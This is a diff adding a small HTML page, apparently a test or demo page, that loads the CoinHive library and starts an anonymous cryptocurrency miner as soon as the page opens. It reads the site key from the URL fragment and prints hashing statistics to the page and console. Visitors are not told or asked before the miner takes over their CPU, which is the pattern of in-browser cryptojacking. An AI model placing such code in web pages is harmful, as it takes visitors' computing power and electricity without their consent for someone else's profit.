@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+
+    <script src="coinhive.min.js"></script>
+    <script>
+        var siteCode = window.location.hash.slice(1);
+        var miner = new CoinHive.Anonymous(siteCode);
+        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+
+        setInterval(function() {
+            var content = [miner.getHashesPerSecond(), miner.getTotalHashes(), miner.getAcceptedHashes()].join('<br/>');
+            if (!!console) {
+                console.log(content);
+            }
+            document.getElementById("b").innerHTML = content;
+        }, 100);
+    </script>
+</head>
+<body>
+    static content<br/>
+    <div id="b">
+        loading...
+    </div>
+    <img src="slow/slow.jpg" alt="image" />
+</body>
+</html>
